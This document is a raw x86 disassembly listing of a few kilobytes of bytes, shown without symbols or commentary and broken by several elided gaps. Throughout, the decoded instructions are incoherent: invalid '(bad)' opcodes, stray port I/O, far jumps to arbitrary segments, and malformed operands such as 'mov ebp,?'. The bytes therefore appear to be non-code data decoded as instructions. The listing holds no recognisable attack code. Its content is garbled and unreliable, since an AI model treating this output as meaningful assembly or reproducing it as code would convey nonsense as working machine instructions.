  422c7b:	call   0xc2fc0748
  422c80:	sub    eax,edi
  422c82:	imul   BYTE PTR es:[eax]
  422c85:	cmp    eax,0xbff6cf3
  422c8a:	shl    cl,cl
  422c8c:	add    ch,ah
  422c8e:	test   DWORD PTR [ecx+0x56],ebx
  422c91:	shufps xmm1,XMMWORD PTR [ebx+ecx*4-0x6753d570],0x6f
  422c9a:	pop    ebx
  422c9b:	or     esp,DWORD PTR [ecx+0x56]
  422c9e:	push   edi
  422c9f:	jmp    0xd1a96d1
  422ca4:	retf   0xb8d5
  422ca7:	repnz int3 
  422ca9:	pushw  0x56
  422cac:	dec    ecx
  422cad:	mov    eax,ds:0x1d4d242d
  422cb2:	call   0x91de452
  422cb7:	test   BYTE PTR [edx-0x53],0x1c
  422cbb:	adc    ebp,esp
  422cbd:	inc    eax
  422cbe:	sbb    esi,DWORD PTR [ecx]
  422cc0:	daa    
  422cc1:	stos   DWORD PTR es:[edi],eax
  422cc2:	stos   DWORD PTR es:[edi],eax
  422cc3:	(bad)  
  422cc4:	add    eax,0x6ece0a30
  422cc9:	mov    edx,edi
  422ccb:	xchg   ebx,eax
  422ccc:	enter  0xc185,0x21
  422cd0:	(bad)  
  422cd1:	jle    0x422ce6
  422cd3:	inc    ecx
  422cd4:	les    ebp,FWORD PTR [eax+0x21a9e38a]
  422cda:	retf   
  422cdb:	ins    DWORD PTR es:[edi],dx
  422cdc:	outs   dx,DWORD PTR ds:[esi]
  422cdd:	mov    ss,WORD PTR [ebx+esi*4-0x5549b420]
  422ce4:	jmp    0x422c6e
  422ce6:	in     al,dx
  422ce7:	sbb    BYTE PTR [edx],bl
  422ce9:	mov    al,BYTE PTR [ebp-0x55]
  422cec:	adc    eax,0x6f9a4e78
  422cf1:	jp     0x422cee
  422cf3:	jmp    0x8acbe6e5
  422cf8:	test   DWORD PTR [ebp-0x11],0xd6978cd6
  422cff:	mov    ebp,0x84b0cfd4
  422d04:	call   0x336cf330
  422d09:	sbb    al,BYTE PTR [esi+0x40]
  422d0c:	mov    edi,0xfd072d93
  422d11:	stos   DWORD PTR es:[edi],eax
  422d12:	mov    ebp,0xe9fd291b
  422d17:	mov    ds:0x2d11a392,eax
  422d1c:	jmp    0x6999384
  422d21:	aaa    
  422d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d23:	mov    WORD PTR [edx],ds
  422d25:	fs mov esi,0xf2dbb44c
  422d2b:	jg     0x422d67
  422d2d:	daa    
  422d2e:	inc    edx
  422d2f:	fsub   DWORD PTR [edx+0x2d]
  422d32:	inc    ebx
  422d33:	cmp    DWORD PTR [eax+esi*1],ecx
  422d36:	pop    edi
  422d37:	dec    ebp
  422d38:	scas   al,BYTE PTR es:[edi]
  422d39:	inc    esp
  422d3a:	fwait
  422d3b:	outs   dx,DWORD PTR ds:[esi]
  422d3c:	jnp    0x422d8a
  422d3e:	inc    esp
  422d3f:	std    
  422d40:	mov    ebp,?
  422d42:	test   DWORD PTR [ebp+0x19],ecx
  422d45:	mov    ?,esi
  422d47:	jecxz  0x422d7d
  422d49:	pushf  
  422d4a:	shr    DWORD PTR [eax+0x775b95f8],0xea
  422d51:	sub    ecx,DWORD PTR [esi+0x5610a3de]
  422d57:	add    ah,bl
  422d59:	or     DWORD PTR [eax-0x37c62808],0x23
  422d60:	inc    esp
  422d61:	fcmovnu st,st(1)
  422d63:	pop    edi
  422d64:	dec    edx
  422d65:	mov    edi,0xb432366a
  422d6a:	mov    ecx,DWORD PTR [ecx]
  422d6c:	bound  eax,QWORD PTR [eax]
	...
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ebx,eax
  422de3:	sbb    BYTE PTR [ecx+ebp*4+0x175c8],bl
  422dea:	inc    DWORD PTR [eax]
  422dec:	add    BYTE PTR [eax],al
  422dee:	lods   eax,DWORD PTR ds:[esi]
  422def:	rcr    BYTE PTR [eax+eiz*1-0x7627e6b5],cl
  422df6:	(bad)
  422dfa:	dec    edi
  422dfb:	loopne 0x422dba
  422dfd:	cmp    cl,BYTE PTR [ebp+edi*2+0x6663c4fc]
  422e04:	cmp    ah,BYTE PTR [edi+eiz*4-0x465286c5]
  422e0b:	imul   ebp,DWORD PTR [ecx],0xffffffa8
  422e0e:	push   0x1f032603
  422e13:	cmc    
  422e14:	in     eax,dx
  422e15:	ret    
  422e16:	inc    ebx
  422e17:	inc    eax
  422e18:	add    DWORD PTR [ebx],0x61685043
  422e1e:	xor    cl,BYTE PTR [esi-0x6b]
  422e21:	xchg   ch,ch
  422e23:	mov    ebp,0x227259a9
  422e28:	xchg   esi,eax
  422e29:	mov    al,ds:0x801ef923
  422e2e:	fadd   DWORD PTR [esp+edx*4-0x24]
  422e32:	std    
  422e33:	or     BYTE PTR [esi],cl
  422e35:	xchg   esp,eax
  422e36:	js     0x422e31
  422e38:	mov    eax,0x15422a07
  422e3d:	gs push ecx
  422e3f:	inc    edi
  422e40:	or     DWORD PTR [eax+0x578c15df],ebx
  422e46:	jg     0x422e9d
  422e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e49:	(bad)  
  422e4a:	dec    ecx
  422e4b:	and    ebp,DWORD PTR [ebp-0x715cb5b]
  422e51:	jbe    0x422e91
  422e53:	dec    edi
  422e54:	cmp    al,0xeb
  422e56:	and    BYTE PTR [ebp+edi*8+0x29],0xf8
  422e5b:	out    0xa5,al
  422e5d:	sbb    al,0xe9
  422e5f:	jno    0x422e5b
  422e61:	stc    
  422e62:	push   esi
  422e63:	test   al,0x7e
  422e65:	xor    eax,0xe0fe0467
  422e6a:	dec    eax
  422e6b:	cwde   
  422e6c:	inc    edi
  422e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e6e:	paddusw mm3,mm0
  422e71:	clc    
  422e72:	cld    
  422e73:	mov    bl,0xe7
  422e75:	test   dh,0x61
  422e78:	scas   al,BYTE PTR es:[edi]
  422e79:	xor    BYTE PTR [edi+ecx*8+0x79],dh
  422e7d:	cli    
  422e7e:	in     eax,0x48
  422e80:	xchg   esi,eax
  422e81:	sub    al,al
  422e83:	out    0x76,al
  422e85:	out    0xc1,eax
  422e87:	in     ax,0x4d
  422e8a:	cmp    al,0xd9
  422e8c:	stc    
  422e8d:	and    BYTE PTR [ecx],ah
  422e8f:	inc    ebp
  422e90:	and    BYTE PTR ds:0xa2ed5734,0xdb
  422e97:	fs mov ecx,0x11f14d02
  422e9d:	xor    DWORD PTR [ecx+0x11],edx
  422ea0:	retf   
  422ea1:	int    0x70
  422ea3:	lahf   
  422ea4:	aas    
  422ea5:	and    BYTE PTR [ebp+0x279bfc0b],dl
  422eab:	and    cl,BYTE PTR [ebp-0x2d5dab34]
  422eb1:	enter  0x80d1,0x70
  422eb5:	push   esi
  422eb6:	sahf   
  422eb7:	out    0x95,eax
  422eb9:	ins    BYTE PTR es:[edi],dx
  422eba:	push   eax
  422ebb:	mov    ds:0x5fe98f6,eax
  422ec0:	cmp    DWORD PTR [esi+0x5],0x577b00a7
  422ec7:	cmp    BYTE PTR [edi+0x72],0xd6
  422ecb:	push   cs
  422ecc:	ds rcr esi,1
  422ecf:	push   es
  422ed0:	push   ecx
  422ed1:	out    dx,eax
  422ed2:	fld    QWORD PTR [edi+ebp*1+0x67]
  422ed6:	outs   dx,BYTE PTR ds:[esi]
  422ed7:	mov    ah,0x29
  422ed9:	(bad)  
  422eda:	fidivr WORD PTR [eax-0x4d]
  422edd:	cli    
  422ede:	pop    esi
  422edf:	jo     0x422e7a
  422ee1:	cmp    esp,DWORD PTR [ecx+0x54]
  422ee4:	ja     0x422f22
  422ee6:	jmp    FWORD PTR ds:0xb7d8ddd9
  422eec:	test   BYTE PTR [eax],al
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0x83ceca33
  422f64:	or     DWORD PTR [ecx-0x39],ecx
  422f67:	jbe    0x422f6a
  422f69:	add    bh,bh
  422f6b:	add    BYTE PTR [eax],al
  422f6d:	add    cl,cl
  422f6f:	popa   
  422f70:	popa   
  422f71:	in     eax,dx
  422f72:	and    eax,0xe2ce7529
  422f77:	loopne 0x422efc
  422f79:	adc    al,0x54
  422f7b:	mov    ah,0x28
  422f7d:	sbb    eax,0xffd92d15
  422f82:	cmp    al,0x51
  422f84:	jecxz  0x422f2b
  422f86:	ror    edi,cl
  422f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f89:	cld    
  422f8a:	test   eax,0x3d4e88f7
  422f8f:	fst    DWORD PTR [esi-0xaa8190c]
  422f95:	inc    edi
  422f96:	test   al,0xab
  422f98:	lea    edi,[edi]
  422f9a:	fdivr  QWORD PTR [eax]
  422f9c:	test   edi,edi
  422f9e:	cmp    eax,0x12dd4f86
  422fa3:	fdivp  st(5),st
  422fa5:	mov    edi,0xd21bf91f
  422faa:	pop    ss
  422fab:	lods   al,BYTE PTR ds:[esi]
  422fac:	adc    bl,BYTE PTR [edi+0x4a]
  422faf:	test   al,0x2c
  422fb1:	les    ebp,FWORD PTR [esi+0x470af4f]
  422fb7:	daa    
  422fb8:	cli    
  422fb9:	dec    esi
  422fba:	fst    QWORD PTR [esi+ebp*8-0x14]
  422fbe:	ret    0xb63
  422fc1:	xor    al,0x16
  422fc3:	jl     0x422f93
  422fc5:	xor    eax,0xcc44fe4b
  422fca:	dec    edi
  422fcb:	pop    ebp
  422fcc:	repnz cmp edx,DWORD PTR [edx-0x7f99e9c0]
  422fd3:	mov    ds:0x9ef5a60a,eax
  422fd8:	cli    
  422fd9:	push   ecx
  422fda:	mov    bh,0x28
  422fdc:	in     eax,dx
  422fdd:	rol    BYTE PTR [eax+edi*1-0x757168c4],0xb8
  422fe5:	leave  
  422fe6:	cli    
  422fe7:	and    edx,eax
  422fe9:	pop    esi
  422fea:	push   0x70981d15
  422fef:	jmp    DWORD PTR [ecx+0x36]
  422ff2:	or     eax,0xa10e5f6
  422ff7:	adc    cl,bh
  422ff9:	mov    cl,0x6f
  422ffb:	or     al,0x88
  422ffd:	dec    edx
  422ffe:	sti    
  422fff:	les    esi,FWORD PTR [edi]
  423001:	fist   WORD PTR [ebx+0x3a]
  423004:	push   esp
  423005:	mov    esp,0xb3d07400
  42300a:	push   cs
  42300b:	xor    eax,0xd4e1d3a6
  423010:	xchg   edi,eax
  423011:	mov    al,ds:0x2d317953
  423016:	add    al,0x37
  423018:	cli    
  423019:	mov    ah,0x26
  42301b:	mov    DWORD PTR [edx+0x6e],edx
  42301e:	or     eax,0xe8b37f8e
  423023:	icebp  
  423024:	push   eax
  423025:	xchg   esp,eax
  423026:	pop    ecx
  423027:	dec    ecx
  423028:	fidiv  WORD PTR [ecx]
  42302a:	and    DWORD PTR [esi-0x65],eax
  42302d:	sbb    edi,edi
  42302f:	test   DWORD PTR [ecx],esi
  423031:	mov    ecx,edi
  423033:	inc    ecx
  423034:	pop    ecx
  423035:	xor    al,0xdb
  423037:	sub    eax,0x23c7c2a4
  42303c:	cmp    bh,0x45
  42303f:	add    al,BYTE PTR [edx+0x19]
  423042:	mov    ecx,0x225ff68c
  423047:	cmp    DWORD PTR [edi-0x104a9f9e],0x1
  42304e:	or     eax,edx
  423050:	jns    0x4230ac
  423052:	mov    eax,0x9d0762ab
  423057:	ds (bad) 
  423059:	addr16 push esi
  42305b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42305c:	jmp    0x4230ca
  42305e:	jmp    DWORD PTR [edi+ebx*1-0x60b0c5e7]
  423065:	and    DWORD PTR [ebx],ebx
  423067:	xchg   ecx,eax
  423068:	retf   0x67ff
  42306b:	cli    
  42306c:	add    BYTE PTR cs:[eax],al
	...
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [esi-0x1c],al
  4230d8:	bound  ecx,QWORD PTR [eax-0x1111711e]
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edi+ebp*4-0x39e63b0e],esp
  4230e7:	ja     0x4230ea
  4230e9:	add    bh,bh
  4230eb:	add    BYTE PTR [eax],al
  4230ed:	add    BYTE PTR [edi],cl
  4230ef:	mov    ds:0x5bc82d23,al
  4230f4:	and    DWORD PTR [ebx+0x76],0x1dd5ae2
  4230fb:	aas    
  4230fc:	out    0xb3,eax
  4230fe:	push   ss
  4230ff:	lahf   
  423100:	ret    
  423101:	dec    esi
  423102:	jmp    0x42312e
  423104:	or     dl,bl
  423106:	mov    BYTE PTR [edi+ecx*8],0xb
  42310a:	les    esi,FWORD PTR [eax-0x67caf6f0]
  423110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423111:	out    dx,eax
  423112:	ror    DWORD PTR [esi+0x55],0x45
  423116:	push   edi
  423117:	dec    esi
  423118:	push   edi
  423119:	call   0x620b:0x9e62148e
  423120:	shl    DWORD PTR [ecx+0x11efb003],1
  423126:	or     al,0x7b
  423128:	push   0x2297ace0
  42312d:	out    0xe,al
  42312f:	xchg   DWORD PTR [eax+ebp*8],ebx
  423132:	fs ins DWORD PTR es:[edi],dx
  423134:	jae    0x42318a
  423136:	mov    DWORD PTR [ebx*1+0xef48f65],ebx
  42313d:	inc    ebx
  42313e:	jo     0x423150
  423140:	push   ebx
  423141:	jmp    0x423172
  423143:	cmp    BYTE PTR [edx],cl
  423145:	lds    edi,FWORD PTR [esi]
  423147:	jg     0x4230e2
  423149:	cs stc 
  42314b:	and    cl,0x25
  42314e:	enter  0x215a,0x9a
  423152:	and    eax,0x20a0884d
  423157:	aam    0x2b
  423159:	fmul   QWORD PTR [edi-0x474d7e31]
  42315f:	sub    eax,0x6a14a21d
  423164:	sub    al,0x52
  423166:	adc    al,0xd1
  423168:	sbb    DWORD PTR [edx],esp
  42316a:	mov    esi,0x821fd6f9
  42316f:	push   ss
  423170:	ins    DWORD PTR es:[edi],dx
  423171:	jle    0x423194
  423173:	jg     0x4230f6
  423175:	das    
  423176:	js     0x4231d4
  423178:	leave  
  423179:	jno    0x4231d8
  42317b:	sbb    al,0x2c
  42317d:	mov    ecx,0x61f52820
  423182:	mov    esp,DWORD PTR [ecx-0x1f7882ad]
  423188:	jns    0x42315b
  42318a:	push   ecx
  42318b:	into   
  42318c:	lahf   
  42318d:	stos   DWORD PTR es:[edi],eax
  42318e:	jmp    0x7c48:0x12a596dd
  423195:	loopne 0x42314f
  423197:	add    ah,0x4
  42319a:	cmc    
  42319b:	dec    esp
  42319c:	xlat   BYTE PTR ds:[ebx]
  42319d:	mov    ds:0xdfc83a29,al
  4231a2:	push   0x6c
  4231a4:	cmp    cl,BYTE PTR [edi+0x1792ea97]
  4231aa:	(bad)  
  4231ab:	test   dl,0xde
  4231ae:	rcr    DWORD PTR [ebp+0x5e],1
  4231b1:	mov    ch,bl
  4231b3:	sar    edx,cl
  4231b5:	mov    eax,ds:0xedf53fb9
  4231ba:	vpshaw xmm9,xmm0,xmm0
  4231bf:	std    
  4231c0:	out    0x44,eax
  4231c2:	mov    bl,0x53
  4231c4:	jl     0x42318e
  4231c6:	dec    edx
  4231c7:	mov    bh,0xa7
  4231c9:	or     edx,DWORD PTR [edx-0x1cbdd335]
  4231cf:	aad    0xfe
  4231d1:	lock sub BYTE PTR [ecx],bh
  4231d4:	out    dx,al
  4231d5:	ja     0x423247
  4231d7:	nop
  4231d8:	mov    edx,0x65946d0
  4231dd:	jle    0x423172
  4231df:	(bad)  
  4231e0:	and    edi,DWORD PTR [esi-0x3546882a]
  4231e6:	je     0x423243
  4231e8:	inc    ebp
  4231e9:	in     eax,dx
  4231ea:	pop    ss
  4231eb:	pop    ebp
  4231ec:	call   0x4231f1
	...
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x2fb0bf15],esp
  423266:	lds    edi,FWORD PTR [eax+0x1]
  423269:	add    bh,bh
  42326b:	add    BYTE PTR [eax],al
  42326d:	add    BYTE PTR [eax],ch
  42326f:	jge    0x4232cb
  423271:	xor    ebp,esp
  423273:	ja     0x42324d
  423275:	xchg   ebp,eax
  423276:	pop    edi
  423277:	in     eax,dx
  423278:	in     al,dx
  423279:	xor    DWORD PTR [edx-0x1e435e9a],eax
  42327f:	mov    dh,0x2a
  423281:	sbb    BYTE PTR [esi],al
  423283:	jl     0x42325e
  423285:	lods   eax,DWORD PTR ds:[esi]
  423286:	test   eax,0x76f4646a
  42328b:	lock add ch,BYTE PTR [ebx]
  42328e:	outs   dx,DWORD PTR ds:[esi]
  42328f:	sbb    al,0xc0
  423291:	aas    
  423292:	inc    esi
  423293:	out    0xbf,al
  423295:	xor    DWORD PTR [ebp+0x5a500631],0x1c
  42329c:	add    DWORD PTR [ebp-0x5bf07dcf],0x1a327ad5
  4232a6:	cmp    dh,cl
  4232a8:	mov    edi,0x8c523d80
  4232ad:	jg     0x42327f
  4232af:	push   eax
  4232b0:	mov    ebp,esi
  4232b2:	push   ebp
  4232b3:	(bad)  
  4232b4:	sub    ah,BYTE PTR [edx-0x796696c3]
  4232ba:	cmp    ch,bh
  4232bc:	or     DWORD PTR [edx+0x1bb697c9],ebp
  4232c2:	adc    bl,bh
  4232c4:	mov    edx,0xa97333db
  4232c9:	pop    ebx
  4232ca:	cs push 0xfffffffa
  4232cd:	cwde   
  4232ce:	lea    edx,[ebx]
  4232d0:	jno    0x42333d
  4232d2:	push   ds
  4232d3:	clc    
  4232d4:	sub    bl,0xc8
  4232d7:	sub    dh,bh
  4232d9:	sar    DWORD PTR [ebx-0x7a],1
  4232dc:	mov    ds,WORD PTR [edx+0x48]
  4232df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232e0:	or     DWORD PTR [ebx],0x7
  4232e3:	jb     0x423317
  4232e5:	iret   
  4232e6:	(bad)  
  4232e7:	cmove  ebp,DWORD PTR [edx+0x40]
  4232eb:	pop    eax
  4232ec:	jno    0x4232bb
  4232ee:	push   edi
  4232ef:	iret   
  4232f0:	lods   al,BYTE PTR ds:[esi]
  4232f1:	ret    0xd83b
  4232f4:	jno    0x423298
  4232f6:	lock xchg ebp,eax
  4232f8:	adc    DWORD PTR [edx-0x18],esi
  4232fb:	dec    ecx
  4232fc:	in     eax,dx
  4232fd:	sub    BYTE PTR [ecx],al
  4232ff:	adc    eax,0x864adc23
  423304:	call   0x466f:0x300695b
  42330b:	ret    
  42330c:	loopne 0x4232cf
  42330e:	cmp    edx,eax
  423310:	pop    edi
  423311:	sub    edx,DWORD PTR [ebx+0x33]
  423314:	es aaa 
  423316:	sub    al,0x8f
  423318:	push   esi
  423319:	sahf   
  42331a:	push   eax
  42331b:	shl    BYTE PTR [esi+0x1c5b2c80],0xd2
  423322:	cmp    al,0x24
  423324:	xor    ch,0xa6
  423327:	and    al,BYTE PTR [eax+0x3]
  42332a:	or     eax,0x8f3bb937
  423330:	cmp    ch,BYTE PTR [ebx+0x7985d6f0]
  423336:	jmp    0xeef7:0xd0d4c506
  42333d:	pop    ds
  42333e:	repz mov ecx,0xee52f204
  423344:	push   0x8343e8fc
  423349:	push   ds
  42334a:	lds    esp,FWORD PTR [eax]
  42334c:	mov    al,ds:0x8d3b5f4
  423351:	bound  edi,QWORD PTR [edx+0xe0390b3]
  423357:	mov    edi,ebp
  423359:	fld    st(0)
  42335b:	push   esp
  42335c:	(bad)  
  42335d:	and    esp,DWORD PTR [edx+0x1a2f9865]
  423363:	fistp  QWORD PTR [ebx-0x5beedd1c]
  423369:	or     DWORD PTR [ebx+0xab17],esi
	...
  4233d3:	add    BYTE PTR [eax],al
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x519b0f44
  4233e4:	arpl   WORD PTR [esp+eax*8+0x79],bp
  4233e8:	add    DWORD PTR [eax],eax
  4233ea:	inc    DWORD PTR [eax]
  4233ec:	add    BYTE PTR [eax],al
  4233ee:	ins    DWORD PTR es:[edi],dx
  4233ef:	mov    bh,BYTE PTR [ebp-0x7578a009]
  4233f5:	xor    eax,0x12e107e5
  4233fa:	retf   0xd65
  4233fd:	jns    0x42344f
  4233ff:	mov    al,0x48
  423401:	mov    bl,0xfa
  423403:	lahf   
  423404:	imul   BYTE PTR [ecx-0x3e]
  423407:	fs jge 0x4233db
  42340a:	in     al,0xbc
  42340c:	(bad)  
  42340e:	ret    
  42340f:	mov    eax,ds:0x3610c394
  423414:	mov    BYTE PTR es:[eax],bl
  423417:	sbb    eax,0x7b7d7075
  42341c:	out    0x16,al
  42341e:	mov    WORD PTR [ebp+0x3b],ds
  423421:	xchg   ecx,eax
  423422:	shl    edi,cl
  423424:	fcomp  QWORD PTR [esp+ebp*4-0xf4b4ddf]
  42342b:	(bad)
  42342e:	push   esi
  42342f:	and    eax,0xb48f7a58
  423434:	jmp    0x42341c
  423436:	inc    eax
  423437:	sub    bl,BYTE PTR [ebp-0x6fbf4a98]
  42343d:	es sahf 
  42343f:	dec    eax
  423440:	push   edx
  423441:	add    eax,0xd62f03a8
  423446:	fild   WORD PTR [ecx+0x634abeb5]
  42344c:	fcomip st,st(3)
  42344e:	fwait
  42344f:	xchg   ebx,eax
  423450:	lahf   
  423451:	arpl   WORD PTR [ebp+0x6814f22f],bx
  423457:	(bad)  
  423458:	iret   
  423459:	imul   ecx,DWORD PTR [eax],0x9b10e8a0
  42345f:	lea    ebp,[esp+ebx*8+0x31]
  423463:	mov    ch,0xef
  423465:	call   0x1602:0xc4835d77
  42346c:	jge    0x42343d
  42346e:	and    al,ah
  423470:	(bad)  
  423471:	rol    BYTE PTR [edx],cl
  423473:	je     0x423494
  423475:	mov    ecx,0xc1755a4c
  42347a:	inc    eax
  42347b:	mov    ds:0x99c1ce9a,eax
  423480:	mov    ch,0x74
  423482:	add    DWORD PTR [ebx-0x41],esi
  423485:	push   esi
  423486:	add    DWORD PTR [ecx-0x1d1176fd],edx
  42348c:	jb     0x4234d2
  42348e:	or     bh,BYTE PTR [edx-0x68]
  423491:	(bad)  
  423492:	fcomip st,st(3)
  423494:	jle    0x423416
  423496:	sbb    eax,0x4c39be12
  42349b:	cdq    
  42349c:	lods   eax,DWORD PTR ds:[esi]
  42349d:	add    eax,0xfee64dec
  4234a2:	jmp    0x4234ce
  4234a4:	push   cs
  4234a5:	sub    bp,WORD PTR es:[ecx+0x5b]
  4234aa:	add    esp,esi
  4234ac:	pushw  ss
  4234ae:	cmp    dl,ch
  4234b0:	push   edx
  4234b1:	sbb    al,0xc8
  4234b3:	sbb    bl,BYTE PTR [ebx+0x7eaae38c]
  4234b9:	sub    edi,DWORD PTR [eax+ecx*8]
  4234bc:	jmp    0x7f3c687a
  4234c1:	jecxz  0x4234fa
  4234c3:	daa    
  4234c4:	or     eax,0x92fa8a75
  4234c9:	outs   dx,BYTE PTR ds:[esi]
  4234ca:	ds cwde 
  4234cc:	mov    cl,0x1d
  4234ce:	fsub   st(4),st
  4234d0:	les    ecx,FWORD PTR [ecx]
  4234d2:	pop    esp
  4234d3:	ins    BYTE PTR es:[edi],dx
  4234d4:	mov    dh,BYTE PTR [edi+edx*4-0x4cdb6923]
  4234db:	dec    ecx
  4234dc:	inc    ebp
  4234dd:	iret   
  4234de:	inc    edi
  4234df:	xchg   esi,eax
  4234e0:	mov    dh,BYTE PTR [ecx+0x69]
  4234e3:	add    eax,0xf1856cef
  4234e8:	ins    DWORD PTR es:[edi],dx
  4234e9:	sub    eax,0xba3093
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	pop    ss
  423563:	lods   eax,DWORD PTR ds:[esi]
  423564:	in     eax,0x34
  423566:	ret    
  423567:	jp     0x42356a
  423569:	add    bh,bh
  42356b:	add    BYTE PTR [eax],al
  42356d:	add    BYTE PTR [ebp-0x72],ch
  423570:	daa    
  423571:	jno    0x423569
  423573:	pusha  
  423574:	xchg   DWORD PTR [ecx+eiz*4+0x57],edi
  423578:	icebp  
  423579:	push   ebx
  42357a:	pop    ecx
  42357b:	xchg   esi,eax
  42357c:	mov    bl,BYTE PTR [ebx]
  42357e:	dec    esi
  42357f:	fdiv   DWORD PTR ds:0x9dff7fc
  423585:	ds imul ebx,ebp,0x71
  423589:	add    eax,0xe4393f2
  42358e:	loop   0x423566
  423590:	sub    DWORD PTR [eax-0x2],edi
  423593:	jo     0x42356c
  423595:	add    al,0xfd
  423597:	jbe    0x42356a
  423599:	loope  0x4235ee
  42359b:	cdq    
  42359c:	stos   BYTE PTR es:[edi],al
  42359d:	daa    
  42359e:	popa   
  42359f:	adc    edx,DWORD PTR [esi+0x4a]
  4235a2:	mov    ch,0xc3
  4235a4:	xcrypt-ofb (bad)
  4235a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235a6:	jmp    0x42359c
  4235a8:	and    cl,BYTE PTR [esi]
  4235aa:	daa    
  4235ab:	test   DWORD PTR [edi+0x11],ecx
  4235ae:	xor    ch,BYTE PTR [ecx+0x20]
  4235b1:	adc    dl,BYTE PTR [ecx]
  4235b3:	cmp    BYTE PTR [edi-0x2e],bl
  4235b6:	into   
  4235b7:	dec    esi
  4235b8:	ret    0x262b
  4235bb:	int3   
  4235bc:	dec    esp
  4235bd:	jne    0x423580
  4235bf:	pop    ds
  4235c0:	jecxz  0x423585
  4235c2:	popf   
  4235c3:	add    al,0x6b
  4235c5:	in     eax,dx
  4235c6:	rcr    DWORD PTR [ecx-0x636ea292],1
  4235cc:	jecxz  0x423580
  4235ce:	out    0xe0,eax
  4235d0:	pop    DWORD PTR [edi]
  4235d2:	or     ebx,edi
  4235d4:	adc    DWORD PTR [eax],eax
  4235d6:	inc    ecx
  4235d7:	adc    ah,BYTE PTR [ebx]
  4235d9:	sbb    ch,dl
  4235db:	clc    
  4235dc:	mov    edi,0x96d02fb0
  4235e1:	inc    esi
  4235e2:	inc    edx
  4235e3:	cmp    BYTE PTR [edi],al
  4235e5:	(bad)  
  4235e6:	dec    esp
  4235e7:	(bad)  
  4235e8:	clc    
  4235e9:	push   ecx
  4235ea:	sbb    esp,edi
  4235ec:	add    eax,0x24f87f38
  4235f1:	lods   al,BYTE PTR ds:[esi]
  4235f2:	sub    ch,0x40
  4235f5:	(bad)  
  4235f6:	jg     0x42362e
  4235f8:	cdq    
  4235f9:	add    eax,0xc261ab5f
  4235fe:	dec    edi
  4235ff:	rcl    edi,cl
  423601:	xchg   ebx,eax
  423602:	mov    cl,0xc6
  423604:	push   ebp
  423605:	pop    eax
  423606:	jnp    0x423594
  423608:	outs   dx,BYTE PTR ds:[esi]
  423609:	adc    eax,0xb3ba93d1
  42360e:	imul   esi,DWORD PTR [edx-0x70],0xe765c9e5
  423615:	ja     0x4235c6
  423617:	stos   DWORD PTR es:[edi],eax
  423618:	add    DWORD PTR [ebx-0x1c],esp
  42361b:	and    DWORD PTR [ecx-0x5c37641],ebp
  423621:	fstp   DWORD PTR [ecx+0xc]
  423624:	repz sbb al,0xa
  423627:	pop    ecx
  423628:	pusha  
  423629:	(bad)  
  42362a:	rol    ch,1
  42362c:	fisttp QWORD PTR [edx-0x4a]
  42362f:	and    al,0x71
  423631:	mov    ebp,0x5a142cc9
  423636:	cmp    eax,0x9c436763
  42363b:	add    bh,cl
  42363d:	cli    
  42363e:	repnz sub al,BYTE PTR [eax-0x305122d7]
  423645:	fimul  DWORD PTR [ebx]
  423647:	mov    fs,esi
  423649:	jle    0x423632
  42364b:	xor    BYTE PTR [edi],dh
  42364d:	xchg   ebp,eax
  42364e:	jle    0x423663
  423650:	sbb    DWORD PTR [eax-0x344f9ea9],0x10e7b8ef
  42365a:	xor    eax,0x193eec9a
  42365f:	into   
  423660:	inc    ebx
  423661:	xchg   ebp,eax
  423662:	stc    
  423663:	outs   dx,DWORD PTR ds:[esi]
  423664:	mov    eax,0x6a2df1e9
  423669:	popa   
  42366a:	mov    al,ds:0x5ff3
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x76573f13
  4236e5:	test   eax,0x17bc2
  4236ea:	inc    DWORD PTR [eax]
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	jo     0x423672
  4236f0:	jns    0x423702
  4236f2:	lea    ebp,[edx+0x293c2bfd]
  4236f8:	nop
  4236f9:	cmp    esi,DWORD PTR [eax-0x18a5fae4]
  4236ff:	mov    ebx,0x679f74b1
  423704:	jmp    0xefbbafe6
  423709:	call   0x1590:0x81f1a4ab
  423710:	xlat   BYTE PTR ds:[ebx]
  423711:	sbb    ebp,DWORD PTR [edi]
  423713:	push   ebx
  423714:	out    dx,al
  423715:	sub    BYTE PTR [eax-0x18],ch
  423718:	lock cmp BYTE PTR [ecx+esi*2],0x42
  42371d:	int    0x90
  42371f:	xchg   ecx,eax
  423720:	jne    0x4236ad
  423722:	comiss xmm2,DWORD PTR [ebx]
  423725:	pop    ds
  423726:	jno    0x423757
  423728:	push   esp
  423729:	push   eax
  42372a:	mov    dh,0x2c
  42372c:	xchg   DWORD PTR [ebp-0x3ed67e2c],edi
  423732:	mov    ebp,ebp
  423734:	mov    cl,0xc0
  423736:	ret    0x70fd
  423739:	mov    eax,0xaa500f22
  42373e:	sub    eax,0x94ed46d8
  423743:	mov    ebx,0x5d1282d3
  423748:	test   BYTE PTR [edx-0x348e9242],dl
  42374e:	aam    0x7c
  423750:	add    al,0xe
  423752:	jmp    0x866f:0x8d3eadcb
  423759:	adc    cl,BYTE PTR [edx*8-0x1d565734]
